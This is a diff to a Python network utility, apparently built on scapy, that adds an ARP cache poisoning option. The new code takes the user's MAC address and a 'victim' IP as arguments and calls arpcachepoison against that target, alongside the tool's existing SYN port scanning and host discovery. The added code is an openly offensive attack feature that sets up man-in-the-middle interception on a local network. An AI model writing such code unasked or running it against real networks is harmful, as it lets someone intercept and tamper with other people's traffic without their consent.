@@ -22,6 +22,7 @@ def main():
     group.add_argument('--interfaces', action='store_true', help="Show a list of detected network interfaces")
     group.add_argument('-s', '--syn', type=str, help="Check for open ports with a syn scan: provide with an ip address & --port option")
     group.add_argument('--arp', action='store_true', help="Try to discover available hosts present on the network")
+    group.add_argument('--arp_poisoning', action='store_true', help="Poison victim's cache (provide --mac & --victim_ip flags")
 
     group_2 = parser.add_mutually_exclusive_group()
 
@@ -30,6 +31,8 @@ def main():
     group_2.add_argument('--read', type=str, help="Read .pcap file and display summary of each packet")
 
     parser.add_argument('--port', type=str, help="Port number of the IP address to scan")
+    parser.add_argument('--mac', type=str, help="Your MAC address")
+    parser.add_argument('--victim_ip', type=str, help="Target's IP")
     parser.add_argument('-i', '--interface', type=str, help="Name of the wireless network adapter")
     parser.add_argument('-c', '--count', type=int, help='# of packets to sniff')
 
@@ -108,6 +111,14 @@ def main():
 
         packets = rdpcap(args.read)
         print(packets.summary())
+
+    if args.arp_poisoning:
+
+        if not args.mac or not args.victim_ip:
+            print(chalk.red("Provide your MAC address & the victim's IP..."))
+            sys.exit(0)
+
+        arpcachepoison(args.mac, args.victim_ip)
 
 
 if __name__ == '__main__':
